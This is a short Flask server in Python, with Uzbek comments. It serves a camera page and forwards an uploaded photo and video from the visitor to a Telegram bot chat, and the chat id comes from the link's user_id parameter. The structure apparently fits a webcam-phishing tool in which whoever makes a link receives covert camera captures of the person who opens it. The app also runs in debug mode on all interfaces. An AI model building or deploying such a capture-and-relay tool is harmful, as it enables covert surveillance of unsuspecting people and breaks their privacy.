from flask import Flask, render_template, request
import os
from dotenv import load_dotenv
import requests

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")

@app.route('/camera')
def camera():
    user_id = request.args.get("user_id")
    return render_template("camera.html", user_id=user_id)

@app.route('/upload', methods=['POST'])
def upload():
    user_id = request.form.get('user_id')
    image = request.files['image']
    video = request.files['video']

    # Rasm yuborish
    files = {'photo': image.stream}
    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={user_id}', files=files)

    # Video yuborish
    files = {'video': video.stream}
    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo?chat_id={user_id}', files=files)

    return 'OK'


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
